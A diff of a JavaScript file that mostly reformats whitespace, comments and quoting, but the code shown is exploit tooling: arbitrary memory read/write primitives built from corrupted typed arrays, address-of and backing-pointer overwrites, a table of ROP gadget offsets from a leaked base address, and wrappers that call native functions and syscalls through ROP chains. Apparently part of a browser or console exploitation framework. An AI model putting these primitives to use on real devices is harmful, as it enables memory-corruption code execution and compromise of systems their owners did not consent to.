@@ -29,7 +29,7 @@ class BigInt {
               hi = Math.floor(value / 0x100000000) >>> 0
             } else {
               BigInt.View.setFloat64(0, value, true)
-              
+
               lo = BigInt.View.getUint32(0, true)
               hi = BigInt.View.getUint32(4, true)
             }
@@ -131,10 +131,10 @@ class BigInt {
       throw new RangeError(`Bit ${idx} is out of range !!`)
     }
 
-    if (idx < 32) { 
+    if (idx < 32) {
       this.lo = (value ? (this.lo | 1 << idx) : (this.lo & ~(1 << idx))) >>> 0
     } else {
-      this.hi = (value ? (this.hi | 1 << (idx - 32)) : (this.hi & ~(1 << (idx - 32)))) >>> 0 
+      this.hi = (value ? (this.hi | 1 << (idx - 32)) : (this.hi & ~(1 << (idx - 32)))) >>> 0
     }
   }
 
@@ -191,7 +191,7 @@ class BigInt {
 
   eq (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
-    
+
     return this.hi === value.hi && this.lo === value.lo
   }
 
@@ -225,7 +225,7 @@ class BigInt {
     var hi = this.hi + value.hi + c
 
     if (hi > 0xFFFFFFFF) {
-      throw new RangeError(`add overflowed !!`)
+      throw new RangeError('add overflowed !!')
     }
 
     return new BigInt(hi, lo)
@@ -382,19 +382,18 @@ DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
   if (value instanceof BigInt) {
     this.setUint32(byteOffset, value.lo, littleEndian)
     this.setUint32(byteOffset + 4, value.hi, littleEndian)
-  }
-  else {
+  } else {
     lo = value >>> 0
     hi = Math.floor(value / 0x100000000) >>> 0
     this.setUint32(byteOffset, lo, littleEndian)
     this.setUint32(byteOffset + 4, hi, littleEndian)
-  }  
+  }
 }
 
 var mem = {
   view: function (addr) {
-    //addr = (addr instanceof BigInt) ? addr : new BigInt(addr)
-    
+    // addr = (addr instanceof BigInt) ? addr : new BigInt(addr)
+
     master[4] = addr.lo
     master[5] = addr.hi
     return slave
@@ -488,22 +487,22 @@ var utils = {
 
     return this.get_backing(bytes)
   },
-  get_backing: function(view) {
+  get_backing: function (view) {
     return mem.view(mem.addrof(view)).getBigInt(0x10, true)
   },
-  set_backing: function(view, addr) {
+  set_backing: function (view, addr) {
     return mem.view(mem.addrof(view)).setBigInt(0x10, addr, true)
   },
-  swap32: function(value) {
+  swap32: function (value) {
     return ((value & 0xff) << 24) | ((value & 0xff00) << 8) | ((value >>> 8) & 0xff00) | ((value >>> 24) & 0xff)
   }
 }
 
 var fn = {
   register: function (input, name, ret) {
-    //if (name in this) {
+    // if (name in this) {
     //  return this[name];
-    //}
+    // }
 
     var id
     var addr
@@ -518,13 +517,13 @@ var fn = {
       addr = syscalls.map.get(input)
     }
 
-    var f = this.wrapper.bind({id: id, addr: addr, ret: ret })
+    var f = this.wrapper.bind({ id, addr, ret })
 
     f.addr = addr
 
     this[name] = f
 
-    return f;
+    return f
   },
   unregister (name) {
     if (!(name in this)) {
@@ -560,7 +559,7 @@ var fn = {
           value = value ? 1 : 0
           break
         case 'number':
-          value = value; //new BigInt(value)
+          // Numbers are passed through as-is (previously: new BigInt(value))
           break
         case 'string':
           value = utils.cstr(value)
@@ -590,28 +589,28 @@ var fn = {
     if (this.ret) {
       result = mem.view(store_addr).getBigInt(8, true)
 
-      //if (this.id) {
-        //if (result.eq(-1)) {
-        //  var errno_addr = this._error()
-        //  var errno = mem.view(errno_addr).getUint32(0, true)
-        //  var str = this.strerror(errno)
+      // if (this.id) {
+      // if (result.eq(-1)) {
+      //  var errno_addr = this._error()
+      //  var errno = mem.view(errno_addr).getUint32(0, true)
+      //  var str = this.strerror(errno)
 
-        //  throw new Error(`${name} returned errno ${errno}: ${str}`)
-        //}
-      //}
+      //  throw new Error(`${name} returned errno ${errno}: ${str}`)
+      // }
+      // }
 
-      switch(this.ret) {
-          case 'bigint':
-            break
-          case 'boolean':
-            result = result.eq(1)
-            break
-          case 'string':
-            result = utils.str(result)
-            break
-          default:
-            throw new Error(`Unsupported return type ${this.ret}`)
-        }
+      switch (this.ret) {
+        case 'bigint':
+          break
+        case 'boolean':
+          result = result.eq(1)
+          break
+        case 'string':
+          result = utils.str(result)
+          break
+        default:
+          throw new Error(`Unsupported return type ${this.ret}`)
+      }
     }
 
     return result
@@ -637,7 +636,7 @@ var gadgets = {
     this.POP_RSP_RET = base.add(0xC89EE)
     this.LEAVE_RET = base.add(0x50C33)
     this.MOV_RAX_QWORD_PTR_RDI_RET = base.add(0x36073)
-    this.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0) 
+    this.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0)
     this.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40 = base.add(0x46E8F0)
     this.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0x3F6F70)
     this.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10 = base.add(0x18B3B5)
@@ -757,7 +756,7 @@ var rop = {
 var struct = {
   register: function (name, fields) {
     if (!Array.isArray(fields) || fields.length === 0) {
-      throw new Error(`Empty fields array !!`)
+      throw new Error('Empty fields array !!')
     }
 
     if (name in this) {
@@ -766,8 +765,8 @@ var struct = {
 
     var [sizeof, infos] = this.parse(fields)
 
-    var cls = class {                    
-      constructor(addr) {
+    var cls = class {
+      constructor (addr) {
         this.addr = addr
       }
     }
@@ -784,7 +783,7 @@ var struct = {
   },
   unregister: function (name) {
     if (!(name in this)) {
-        throw new Error(`${name} not registered in struct !!`)
+      throw new Error(`${name} not registered in struct !!`)
     }
 
     delete this[name]
@@ -806,9 +805,9 @@ var struct = {
       var [, name, count] = field.name.match(/^(.+?)(?:\[(\d+)\])?$/)
 
       if (type.includes('*')) {
-          size = 8
-          alignment = 8
-          pointer = true
+        size = 8
+        alignment = 8
+        pointer = true
       } else if (type in this) {
         size = this[type].sizeof
       } else {
@@ -822,21 +821,21 @@ var struct = {
       }
 
       if (size === 0) {
-          throw new Error(`Invalid size for ${field.name} !!`)
+        throw new Error(`Invalid size for ${field.name} !!`)
       }
 
       count = count ? parseInt(count) : 1
 
       if (offset % alignment !== 0) {
-          offset += alignment - (offset % alignment)
+        offset += alignment - (offset % alignment)
       }
 
-      infos.push({type: type, name: name, offset: offset, size: size, count: count, pointer: pointer})
+      infos.push({ type, name, offset, size, count, pointer })
 
       offset += size * count
 
       if (alignment > struct_alignment) {
-          struct_alignment = alignment
+        struct_alignment = alignment
       }
     }
 
@@ -856,8 +855,8 @@ var struct = {
           }
 
           var arr
-          switch(info.type) {
-            case 'Int8': 
+          switch (info.type) {
+            case 'Int8':
               arr = new Int8Array(info.count)
               utils.set_backing(arr, addr)
               break
@@ -865,7 +864,7 @@ var struct = {
               arr = new Uint8Array(info.count)
               utils.set_backing(arr, addr)
               break
-            case 'Int16': 
+            case 'Int16':
               arr = new Int16Array(info.count)
               utils.set_backing(arr, addr)
               break
@@ -902,7 +901,7 @@ var struct = {
           return arr
         } else {
           var value = mem.view(this.addr).getBigInt(info.offset, true)
-          switch(info.type) {
+          switch (info.type) {
             case 'Int8': return value.i8[0]
             case 'Uint8': return value.u8[0]
             case 'Int16': return value.i16[0]
@@ -915,7 +914,7 @@ var struct = {
               if (info.pointer) {
                 return value
               }
-                
+
               throw new Error(`Invalid type ${info.type}`)
           }
         }
@@ -929,7 +928,7 @@ var struct = {
           if (value.buffer.byteLength !== info.size * info.count) {
             throw new Error(`expected ${info.size * info.count} bytes got ${value.buffer.byteLength}`)
           }
-              
+
           var addr = this.addr.add(info.offset)
           if (info.type.includes('*')) {
             addr = mem.view(addr).getBigInt(0, true)
@@ -941,8 +940,8 @@ var struct = {
           buf.set(value)
         } else {
           var temp = mem.view(this.addr).getBigInt(info.offset, true)
-          switch(info.type) {
-            case 'Int8': 
+          switch (info.type) {
+            case 'Int8':
               temp.i8[0] = value
               break
             case 'Uint8':
@@ -988,9 +987,9 @@ var syscalls = {
   init: function (addr) {
     var offset = 0
     var count = 0x40000
-    
+
     var view = mem.view(addr)
-    
+
     var start_offset = 0
     var pattern_idx = 0
     while (offset < count) {
